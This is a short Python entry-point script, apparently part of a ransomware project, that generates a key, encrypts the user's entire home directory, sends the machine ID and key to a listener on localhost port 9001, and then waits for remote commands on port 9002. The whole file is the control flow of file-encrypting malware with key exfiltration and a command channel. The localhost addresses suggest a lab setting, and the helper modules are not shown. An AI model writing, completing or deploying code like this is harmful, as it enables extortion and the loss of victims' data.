from utils import generate_key, get_machine_uuid
from encryption import encrypt_directory
from communication import send_initial_data, listen_for_commands
import os

def main():
    key = generate_key()
    uuid = get_machine_uuid()
    home = os.path.expanduser("~")

    encrypt_directory(home, key)
    send_initial_data("127.0.0.1", 9001, uuid, key)
    listen_for_commands("127.0.0.1", 9002)

if __name__ == "__main__":
    main()
